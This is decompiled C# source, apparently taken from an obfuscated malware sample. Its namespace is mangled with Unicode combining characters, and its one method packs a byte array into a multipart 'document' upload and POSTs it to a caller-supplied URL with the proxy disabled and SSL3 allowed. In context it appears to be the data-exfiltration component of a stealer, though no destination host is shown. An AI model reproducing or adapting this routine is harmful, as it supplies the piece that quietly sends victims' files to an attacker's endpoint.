using System;
using System.Net;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000092 RID: 146
	public class Class_112
	{
		// Token: 0x060002ED RID: 749 RVA: 0x00015B14 File Offset: 0x00013D14
		public static void xmethod_411(byte[] byteDizi_0, string str_0, string str_1, string str_2)
		{
			ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
			WebClient webClient = new WebClient
			{
				Proxy = null
			};
			string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
			webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
			string @string = webClient.Encoding.GetString(byteDizi_0);
			string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
			{
				text,
				str_0,
				str_1,
				@string
			});
			byte[] bytes = webClient.Encoding.GetBytes(s);
			webClient.UploadData(str_2, "POST", bytes);
		}
	}
}
